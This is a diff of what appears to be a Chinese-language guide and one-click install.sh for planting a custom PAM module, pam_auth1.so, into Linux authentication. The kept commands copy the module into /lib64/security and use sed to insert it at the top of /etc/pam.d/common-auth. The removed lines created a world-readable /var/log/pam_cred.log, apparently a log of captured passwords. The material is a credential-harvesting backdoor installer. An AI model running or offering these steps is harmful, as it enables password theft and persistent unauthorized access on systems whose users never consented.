@@ -66,12 +66,6 @@ sudo sed -i '1i auth    optional    pam_auth1.so\naccount optional    pam_auth1.
 sudo chmod 644 /lib64/security/pam_auth1.so
 ```
 
-# 4. 创建日志文件
-```
-sudo touch /var/log/pam_cred.log
-sudo chmod 644 /var/log/pam_cred.log
-sudo chown root:root /var/log/pam_cred.log
-```
 
 4. 一键自动化部署脚本Debian/Ubuntu/Kali 一键脚本（保存为 install.sh）bash
 ```
@@ -88,11 +82,6 @@ fi
 
 # 添加 PAM 配置
 sudo sed -i '1i auth    optional    pam_auth1.so\naccount optional    pam_auth1.so' /etc/pam.d/common-auth
-
-# 日志文件
-sudo touch /var/log/pam_cred.log
-sudo chmod 644 /var/log/pam_cred.log
-sudo chown root:root /var/log/pam_cred.log
 
 sudo chmod 644 /lib/*/security/pam_auth1.so 2>/dev/null
 
@@ -111,9 +100,6 @@ sudo cp pam_auth1.so /lib64/security/pam_auth1.so
 sudo sed -i '1i auth    optional    pam_auth1.so\naccount optional    pam_auth1.so' /etc/pam.d/common-auth
 
 # 日志文件
-sudo touch /var/log/pam_cred.log
-sudo chmod 644 /var/log/pam_cred.log
-sudo chown root:root /var/log/pam_cred.log
 
 sudo chmod 644 /lib64/security/pam_auth1.so
 
